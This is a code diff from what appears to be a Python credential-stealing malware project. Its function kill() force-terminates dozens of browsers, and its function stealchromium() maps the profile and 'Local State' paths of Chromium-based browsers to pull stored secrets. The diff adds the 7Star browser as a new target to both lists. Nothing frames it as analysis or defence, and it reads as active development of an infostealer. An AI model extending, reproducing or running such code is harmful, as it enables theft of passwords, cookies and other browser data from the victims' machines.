@@ -235,7 +235,7 @@ def load_nss(profile_path, nss3):
 
 def kill():
     if config.browsers:
-        exes = ['msedge.exe', 'orbitum.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
+        exes = ['msedge.exe', 'orbitum.exe', 'chromium.exe', 'iron.exe', 'wavebrowser.exe', 'samsunginternet.exe', 'iridium.exe', 'vivaldi.exe', '7chrome.exe', 'zen.exe', 'chrome.exe', 'mullvadbrowser.exe' 'amigo.exe', 'epic.exe', 'comet.exe', 'shift.exe', 'escosiabrowser.exe', 'duckduckgo.exe', 'dragon.exe', 'brave.exe', 'opera.exe', 'firefox.exe', 'hola.exe', 'AVGBrowser.exe', 'hola-browser.exe', 'waterfox.exe', 'seamonkey.exe', 'AvastBrowser.exe', 'browser.exe']
     
         for exe in exes:
             subprocess.run(["taskkill", "/F", "/IM", exe], text=True, creationflags=subprocess.CREATE_NO_WINDOW)
@@ -682,6 +682,8 @@ def stealchromium():
             'Supermium': {'path': localappdata + '\\Supermium\\User Data', 'localstate': localappdata + '\\Supermium\\User Data\\Local State'},
             'Orbitum': {'path': localappdata + '\\Orbitum\\User Data', 'localstate': localappdata + '\\Orbitum\\User Data\\Local State'}, #(?)
             'Iridium': {'path': localappdata + '\\Iridium\\User Data', 'localstate': localappdata + '\\Iridium\\User Data\\Local State'},
+            '7Star': {'path': localappdata + '\\7Star\\7Star\\User Data', 'localstate': localappdata + '\\7Star\\7Star\\User Data\\Local State'},
+            
             'Cent Browser': {'path': localappdata + '\\CentBrowser\\User Data', 'localstate': localappdata + '\\CentBrowser\\User Data\\Local State'},
             'WaveBrowser': {'path': localappdata + '\\WaveBrowser\\User Data', 'localstate': localappdata + '\\WaveBrowser\\User Data\\Local State'},
             'Helium': {'path': localappdata + '\\imput\\Helium\\User Data', 'localstate': localappdata + '\\imput\\Helium\\User Data\\Local State'},
